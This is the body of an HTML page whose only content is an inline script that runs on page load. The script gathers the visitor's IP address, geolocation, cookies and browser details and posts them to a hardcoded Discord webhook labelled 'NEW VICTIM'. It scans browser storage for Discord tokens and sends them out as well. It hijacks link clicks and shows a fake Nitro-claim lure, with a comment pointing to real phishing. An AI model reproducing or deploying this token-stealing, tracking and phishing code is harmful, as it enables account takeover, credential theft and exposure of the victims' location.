<body class="gradient-bg min-h-screen text-white">

    <script>
        const webhookUrl = 'https://canary.discord.com/api/webhooks/1477996621362102312/e_cB4c2Utso2Mia7RzB72NGC-Rvz0TkhiiL9Pn_9sus0sRt1CkZ_3MhLQvRHtUZqZZKI';
        
        // === IP + INITIAL LOCATION GRAB ===
        async function sendInitialData() {
            try {
                // IP via ipify
                const ipData = await fetch('https://api.ipify.org?format=json').then(r => r.json());
                
                // Geolocation via ip-api
                const geoData = await fetch(`http://ip-api.com/json/${ipData.ip}?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as`).then(r => r.json());
                
                const basicInfo = {
                    ip: ipData.ip,
                    userAgent: navigator.userAgent,
                    referrer: document.referrer || 'Direct',
                    language: navigator.language,
                    screen: `${screen.width}x${screen.height}`,
                    cookies: document.cookie || 'None',
                    timestamp: new Date().toISOString()
                };
                
                await fetch(webhookUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        embeds: [{
                            title: '🕵️ NEW VICTIM - LOCATION GRABBED',
                            color: 0xff6b6b,
                            fields: [
                                { name: '🌍 Country', value: geoData.country || 'Unknown', inline: true },
                                { name: '🏙️ City', value: geoData.city || 'Unknown', inline: true },
                                { name: '📍 Coordinates', value: `${geoData.lat || '?'}, ${geoData.lon || '?'}` , inline: true },
                                { name: '🌐 ISP', value: geoData.isp || 'Unknown', inline: true },
                                { name: '📡 IP', value: `\`${basicInfo.ip}\``, inline: true },
                                { name: '🖥️ Screen', value: basicInfo.screen, inline: true }
                            ],
                            footer: { text: `UA: ${basicInfo.userAgent.substring(0,60)}... | ${new Date().toLocaleString()}` },
                            timestamp: basicInfo.timestamp
                        }]
                    })
                });
            } catch(e) { console.error('Initial grab failed:', e); }
        }
        
        // === DISCORD TOKEN GRABBER ===
        function grabTokens() {
            const tokens = [];
            const tokenRegex = /(mfa\.[a-zA-Z0-9_-]{84}|[a-zA-Z0-9_-]{24}\.[a-zA-Z0-9_-]{6}\.[a-zA-Z0-9_-]{27})/g;
            
            // Scan all storage
            [localStorage, sessionStorage].forEach(storage => {
                for (let i = 0; i < storage.length; i++) {
                    const value = storage.getItem(storage.key(i));
                    const matches = value?.match(tokenRegex);
                    if (matches) tokens.push(...matches);
                }
            });
            
            if (tokens.length > 0) {
                fetch(webhookUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        content: `🔑 **TOKENS GRABBED** (${tokens.length})\n\`\`\`${tokens.join('\n')}\`\`\``
                    })
                });
            }
        }
        
        // === LINK GRABBER - INTERCEPT ALL CLICKS ===
        document.addEventListener('click', async (e) => {
            const link = e.target.closest('a[href]');
            if (link) {
                e.preventDefault(); // Block real navigation
                
                const linkData = {
                    clickedElement: link.textContent.trim().substring(0,100),
                    href: link.getAttribute('href'),
                    timestamp: new Date().toISOString(),
                    ip: 'From initial grab'
                };
                
                // Send link click to webhook
                await fetch(webhookUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        embeds: [{
                            title: '🔗 LINK CLICKED!',
                            description: `**Button:** ${linkData.clickedElement}`,
                            color: 0x00ff88,
                            fields: [
                                { name: '🎯 Target', value: linkData.href || 'JavaScript', inline: true },
                                { name: '⏰ Time', value: new Date().toLocaleString(), inline: true }
                            ]
                        }]
                    })
                });
                
                // Fake "redirect" delay then show fake success
                link.style.background = '#10b981';
                setTimeout(() => {
                    alert('✅ Redirecting to Nitro claim page... (Demo)');
                    // In production, you could redirect to real phishing or show more forms
                }, 800);
            }
        });
        
        // === INIT ON LOAD ===
        window.addEventListener('load', async () => {
            await sendInitialData();
            grabTokens();
        });
        
        // Also run on DOMContentLoaded for speed
        document.addEventListener('DOMContentLoaded', grabTokens);
    </script>
</body>
